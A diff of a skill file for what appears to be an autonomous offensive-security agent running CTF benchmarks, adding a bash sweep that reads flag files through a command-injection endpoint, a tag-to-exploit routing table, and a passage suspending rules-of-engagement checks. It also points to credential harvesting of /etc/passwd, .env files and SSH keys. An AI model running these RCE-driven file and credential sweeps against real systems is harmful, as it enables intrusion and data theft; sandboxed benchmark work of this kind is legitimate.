@@ -1,44 +1,117 @@
 ---
 name: benchmark
-description: "CTF benchmark mode — meta-rules for automated benchmark runs. Routing/playbooks live in /skills/exploit/* and /skills/recon/*; this file only documents benchmark-specific conventions."
+description: "Benchmark mode marker — engagement objective is flag capture. Generic engagement rules apply unchanged."
 allowed-tools: Bash Read Write
 metadata:
   subdomain: benchmark
-  when_to_use: "benchmark, ctf, challenge, flag capture, benchmark mode, automated evaluation"
+  when_to_use: "benchmark, ctf, challenge, flag capture"
   tags: benchmark, ctf
 ---
 
-# Benchmark Mode — Meta-Rules
+# Benchmark Mode
 
-This file documents conventions specific to running automated CTF benchmark cycles. **Vulnerability routing and exploit playbooks live in their own skill files, not here** — the orchestrator delegates to sub-agents who load the right `/skills/<area>/<vuln>.md` themselves.
+The engagement objective is **flag capture**. Per-challenge context
+(target URL, vulnerability tags, flag format, mission brief, extra
+service ports) is injected into the system message every model call by
+`EngagementContextMiddleware` — read it; do NOT duplicate it here, and
+do NOT ask the operator for it.
 
-## Orchestrator delegation contract
+## Suspended CRITICAL_RULES under benchmark mode
 
-1. Build an OPPLAN with two objectives: `RECON` (priority 1) and `INITIAL_ACCESS` (priority 2, `blocked_by=[OBJ-001]`).
-2. ALWAYS delegate `RECON` to the **recon sub-agent** first via `task()` — NEVER skip recon, even if the vulnerability tag seems obvious. Recon validates the oracle, captures session state, and inspects challenge source for hardcoded keys/flags.
-3. Delegate `INITIAL_ACCESS` to the **exploit sub-agent** via `task()`. The exploit sub-agent loads its own routing from `/skills/exploit/web/SKILL.md` (web vulns) or `/skills/exploit/ad/SKILL.md` (AD vulns) and picks the right `<vuln>.md` based on the challenge tags.
-4. Do NOT run bash exploitation directly from the orchestrator — delegate.
+- Rule 8 (Startup Required) — flag IS the deliverable; no roe/conops/deconfliction.
+- Rule 9 (Final Report) — no executive summary; the flag string is the report.
 
-Sub-agents load their own skills (`load_skill`) before first bash. Routing tables, technique playbooks, and shell snippets are NOT duplicated here — they live in `/skills/exploit/web/`, `/skills/exploit/ad/`, `/skills/recon/`, etc.
+All other CRITICAL_RULES remain active. Recon→exploit ordering, OPPLAN
+discipline, no-bash-in-orchestrator, tag routing, OPSEC, and budget
+pacing live in their owning prompts/skills (see `decepticon.md` Rules
+20/22, the recon/exploit agent prompts, and `/skills/standard/exploit/web/SKILL.md`
+for vuln routing).
 
-## Benchmark-specific conventions
+## SHORT-CIRCUIT — flag/credential found
 
-- **Target URL**: Use ONLY the URL from the challenge context. Do NOT scan random ports. Do NOT exfiltrate beyond the target.
-- **Flag format**: `FLAG{<64-character-hex>}`. The flag MUST appear verbatim in the agent's final message for the harness to detect it.
-- **Time budget**: ~30 minutes per challenge (1800s harness timeout). The agent should self-pace: a 10k-password brute force is NEVER appropriate; pivot at the budget caps in `/skills/exploit/workflow.md`.
-- **Workspace**: All artifacts under `/workspace/benchmark-<CHALLENGE_ID>/`. Persist evidence (`recon-report.md`, exploit scripts, raw HTTP captures) so the next cycle's analysis has a paper trail.
-- **Authorization**: Full — isolated CTF container. No restrictions. No need to ask for permission before scanning, fuzzing, exploiting, or extracting data within the target.
-- **Multiple tags**: Tags are hints, not commands. Pick the most specific exploit class first (per `/skills/exploit/web/SKILL.md` routing). When primary attack class fails verification gate, pivot to secondary tags.
-- **Network-only target interaction**: The sandbox is for sending authorized HTTP/TCP requests to the provided target, not for inspecting benchmark source. Infer routes, credentials, proxy behavior, and internal services from network responses, page comments, headers, error messages, and reflected diagnostics.
-- **Flag hunt locations**: After exploitation, check standard paths: `/flag`, `/flag.txt`, `/FLAG.txt`, `/static/flag.txt`, env vars, db tables named `flag*`/`secret*`. (Detailed playbooks live in `/skills/exploit/<vuln>.md`.)
+When a sub-agent (recon or exploit) returns a verified flag or
+flag-equivalent credential:
+
+1. `update_objective` remaining objectives to `passed`.
+2. Your VERY NEXT response is the final answer, re-echoing the flag
+   VERBATIM in the format announced by the middleware (e.g.
+   `Flag captured: FLAG{<value>}`). The harness scans ONLY the
+   orchestrator's final message — if the flag string lives only inside
+   a sub-agent return, it is LOST.
+
+## Flag-path sweep (after RCE confirmed)
+
+Generic skills under `/skills/standard/exploit/web/` (`command-injection.md`, `cve.md`, etc.) cover credential/secret extraction but intentionally exclude CTF flag conventions. Once any RCE primitive is confirmed (`id`, `hostname`, or arbitrary file read), run this single batched sweep — do NOT issue one curl per path:
+
+```bash
+# CTF flag-path conventions — XBOW / picoCTF / HackTheBox / TryHackMe overlap.
+for f in /opt/flag.txt /flag /flag.txt /root/flag.txt /root/flag \
+         /home/*/flag.txt /home/*/flag /tmp/flag.txt /tmp/flag \
+         /var/www/flag.txt /var/www/html/flag.txt /srv/flag.txt /srv/flag; do
+  result=$(curl -s "http://<TARGET>/<RCE_SINK>?cmd=cat+$f" 2>/dev/null | head -5)
+  [ -n "$result" ] && echo "=== $f ===" && echo "$result"
+done | tee /tmp/flag_sweep.txt
+head -50 /tmp/flag_sweep.txt
+
+# Broad flag-filename find (when path is non-standard)
+curl -s "http://<TARGET>/<RCE_SINK>?cmd=find+/+-type+f+\(-name+'flag*'-o+-name+'FLAG*'\)+-not+-path+'/proc/*'+-not+-path+'/sys/*'+2>/dev/null" \
+  -o /tmp/find_flag.txt
+head -20 /tmp/find_flag.txt
+```
+
+Replace `<RCE_SINK>` with the confirmed injection endpoint. If the flag's `format` (e.g. `FLAG{...}`, `flag{...}`, `CTF{...}`) was announced by the middleware, additionally grep the harvest for that prefix:
+
+```bash
+grep -hoE '(FLAG|flag|CTF)\{[^}]+\}' /tmp/flag_sweep.txt /tmp/find_flag.txt | sort -u
+```
+
+The generic credential harvest (`/etc/passwd`, `.env`, configs, SSH keys, secret/cred/token files) lives in `/skills/standard/exploit/web/command-injection.md` — run BOTH sweeps post-RCE; flag-path first (objective), credential second (lateral).
+
+## Tag → Skill Routing Table (BENCHMARK FAST-PATH)
+
+Benchmark mode pre-declares `Vulnerability tags:` in the engagement context, leaking the
+challenge's intended attack class. **In real engagements no such metadata exists** — agents
+discover the class through the domain router skill applied to recon's raw observations.
+This table is the canonical fast-path for the benchmark shortcut and the **only** place
+this mapping lives. Generic agent prompts (`recon.md`, `exploit.md`, `decepticon.md`)
+intentionally do not encode it — they route via the domain router skills
+(`/skills/standard/exploit/<domain>/SKILL.md`) on observation evidence.
+
+**Consumer**: the orchestrator (`decepticon.md`). When dispatching exploit, the orchestrator
+may consult this table to pick the matching sub-skill directly from the pre-declared tags,
+skipping the observation-based router classification. **Recon does NOT consume this table**
+— recon's role is observation, not classification or skill recommendation.
+
+| `Vulnerability tag` | `/skills/standard/exploit/web/<X>.md` |
+|---|---|
+| `sqli`                       | `sqli.md` |
+| `blind_sqli`                 | `blind-sqli.md` (load with `sqli.md` when sqlmap+tamper is exhausted) |
+| `xss`                        | `xss.md` |
+| `ssti`                       | `ssti.md` |
+| `ssrf`                       | `ssrf.md` |
+| `xxe`                        | `xxe.md` |
+| `lfi`                        | `lfi.md` |
+| `path_traversal`             | `lfi.md` |
+| `command_injection`          | `command-injection.md` |
+| `insecure_deserialization`   | `deserialization.md` |
+| `idor`                       | `idor.md` |
+| `arbitrary_file_upload`      | `file-upload.md` |
+| `file_upload`                | `file-upload.md` |
+| `graphql`                    | `graphql.md` |
+| `race_condition`             | `race-condition.md` |
+| `smuggling`                  | `smuggling.md` |
+| `crypto`                     | `crypto.md` |
+| `business_logic`             | `business-logic.md` |
+| `default_credentials`        | `business-logic.md` |
+| `jwt`                        | `business-logic.md` (no dedicated file) |
+| `cve`                        | `cve.md` |
+
+For multiple tags → emit one `REQUIRED SKILL LOAD:` line per mapped skill.
 
 ## What this skill is NOT
 
-This skill does NOT contain vulnerability routing tables, exploit shell snippets, recon playbooks, or per-tag technique guidance. Those files are the source of truth:
-- Vuln routing for web → `/skills/exploit/web/SKILL.md`
-- Vuln routing for AD → `/skills/exploit/ad/SKILL.md`
-- Recon playbooks → `/skills/recon/<sub-area>/SKILL.md`
-- Sandbox/bash discipline → auto-injected via `<BASH_TOOLS>` in every agent's system prompt
-- General shared workflow → auto-injected via `/skills/shared/workflow.md`
-
-If you find yourself adding a per-tag table, technique snippet, or routing rule HERE, you are in the wrong file. Add it to the relevant `/skills/<area>/` file instead.
+- vulnerability routing → `/skills/standard/exploit/{web,ad}/SKILL.md`
+- recon playbooks → `/skills/standard/recon/<area>/SKILL.md`
+- OPSEC → `/skills/shared/opsec/SKILL.md`
+- per-challenge context → middleware-injected, every turn
+- agent-specific behavior → that agent's prompt and `/skills/<agent>/`
